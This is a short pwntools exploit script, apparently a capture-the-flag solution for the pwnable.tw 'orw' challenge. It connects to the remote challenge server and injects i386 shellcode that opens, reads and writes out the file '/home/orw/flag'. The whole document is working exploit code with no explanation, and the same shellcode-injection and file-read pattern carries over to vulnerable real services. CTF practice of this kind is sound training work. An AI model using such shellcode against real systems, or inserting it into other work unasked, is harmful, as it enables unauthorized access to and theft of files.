from pwn import *
#io = process('./orw')
io = remote("chall.pwnable.tw", 10001)
context.log_level = 'debug'
shellcode = ''
shellcode += asm(shellcraft.i386.linux.echo('123'))
shellcode += asm(shellcraft.i386.pushstr('/home/orw/flag'))
shellcode += asm(shellcraft.i386.linux.open('esp', "O_RDONLY", 0))
shellcode += asm(shellcraft.i386.linux.read('eax', 'esp', 1024)) #eax is the fd that open returned
shellcode += asm(shellcraft.i386.linux.write(1, 'esp', 1024))

io.recvuntil(':')
io.sendline(shellcode)
io.interactive()
